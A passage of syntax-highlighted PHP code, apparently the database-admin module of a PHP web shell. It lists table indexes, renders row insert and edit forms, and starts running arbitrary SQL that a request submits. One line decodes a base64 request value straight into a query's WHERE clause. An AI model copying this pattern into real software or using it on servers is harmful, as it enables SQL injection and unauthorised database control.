<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Seq_in_index'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Column_name'</span>].(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Sub_part'</span>] ? <span style="color: #8abeb7;">'('</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ro</span><span style="color: #f0c674; text-decoration: underline;">w</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Sub_part'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Cardinality'</span>] ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Cardinality'</span>] : 0)<span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Collation'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Null'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Comment'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   tbfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'insert'</span> || <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'edit'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = q(<span style="color: #8abeb7;">'SHOW COLUMNS FROM '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span> = mysql_fetch_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span>[] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rs</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'insert'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;Insert new line in '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span>.<span style="color: #8abeb7;">' table &amp;raquo;&lt;/</span><span style="color: #8abeb7; text-decoration: underline;">h2&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;Update record in '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span>.<span style="color: #8abeb7;">' table &amp;raquo;&lt;/h2</span><span style="color: #8abeb7; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">where</span> = base64_decode(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">base64</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = q(<span style="color: #8abeb7;">"SELECT * FROM </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;"> WHERE </span><span style="color: #f0c674;">$where</span><span style="color: #8abeb7;"> LIMIT</span><span style="color: #8abeb7; text-decoration: underline;"> 1"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rs</span> = mysql_fetch_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;form method="post" action="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'tablename'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rs</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>]]) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span> = htmlspecialchars(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rs</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>]]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg = bg();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg.<span style="color: #8abeb7;">'" onmouseover="this.className=\</span><span style="color: #8abeb7; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">bg.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key'</span>] == <span style="color: #8abeb7;">'UNI'</span> || <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Extra'</span>] == <span style="color: #8abeb7;">'auto_incre</span><span style="color: #8abeb7; text-decoration: underline;">ment'</span><span style="text-decoration: underline;"> || </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;&lt;b&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>].<span style="color: #8abeb7;">'&lt;/b&gt;&lt;br /&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Type'</span>].<span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {<span style="color: #de935f; background-color: #373b41;">                            </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;&lt;b&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>].<span style="color: #8abeb7;">'&lt;/b&gt;&lt;br /&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Type'</span>].<span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Field'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">']" style="width:500px;height:60px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'insert'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.bg().<span style="color: #8abeb7;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #8abeb7; text-decoration: underline;">" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.bg().<span style="color: #8abeb7;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #8abeb7; text-decoration: underline;">" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'base64'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">base64</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/table&gt;&lt;/form&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">querys</span> = <span style="color: #81a2be;">@explode</span>(<span style="color: #8abeb7;">';'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_query</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">querys</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">num</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>) {
